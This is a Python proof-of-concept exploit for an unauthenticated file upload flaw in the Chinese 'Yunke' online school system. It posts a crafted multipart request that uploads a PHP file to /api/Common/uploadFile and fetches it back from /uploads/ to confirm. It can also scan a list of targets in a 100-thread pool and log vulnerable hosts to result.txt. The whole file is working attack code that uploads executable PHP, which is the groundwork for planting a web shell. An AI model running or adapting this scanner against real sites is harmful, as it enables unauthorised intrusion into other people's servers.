import argparse
import requests
import os
import sys
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def banner():
    test = '''
云课网校系统文件上传漏洞          
                                               author:sanhua
                                               date:2024-09-15
                                               version:1.0
    '''
    print(test)


def verify_upload(target, file_name):
    # 为验证构建 URL（假设文件直接可通过 /uploads/ 访问）
    uploaded_file_url = f"{target}/uploads/{file_name}"

    try:
        # 尝试访问已上传的文件
        response = requests.get(uploaded_file_url, verify=False, timeout=10)
        if response.status_code == 200:
            if "hello" in response.text:  # 根据文件内容确认
                logger.info(f"[+] 文件 {file_name} 上传成功，内容校验通过！")
                with open("result.txt", "a", encoding='utf-8') as f:
                    f.write(f"{target} 存在漏洞\n")
            else:
                logger.warning(f"[-] {target} 文件 {file_name} 上传成功，但内容不匹配！")
        else:
            logger.error(f"[-] 上传文件通过 URL {uploaded_file_url} 访问失败，状态码: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logger.error(f"[!] 访问上传文件时发生错误: {e}")


def poc(target):
    if not target.startswith('http://') and not target.startswith('https://'):
        target = 'http://' + target

    payload = "/api/Common/uploadFile"  # 根据实际情况修改
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6"
    }

    data = (
        "------WebKitFormBoundaryHHaZAYecVOf5sfa6\r\n"
        'Content-Disposition: form-data; name="uplo_file"; filename="1.php"\r\n'
        "\r\n"
        "<?php echo \"hello\";?>\r\n"
        "------WebKitFormBoundaryHHaZAYecVOf5sfa6--\r\n"
    )

    try:
        # 发送 POST 请求以上传文件
        response = requests.post(target + payload, headers=headers, data=data, verify=False, timeout=10)

        if response.status_code == 200:
            logger.info(f"[+] 文件上传成功, 正在验证上传...")
            verify_upload(target, "1.php")  # 验证上传的文件
        else:
            logger.error(f"[-] 文件上传失败，状态码: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logger.error(f"[!] 请求 {target} 时发生错误: {e}")


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="云课网校系统文件上传漏洞")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t 请使用 -u 或 -f 参数来运行此脚本。")


if __name__ == '__main__':
    main()
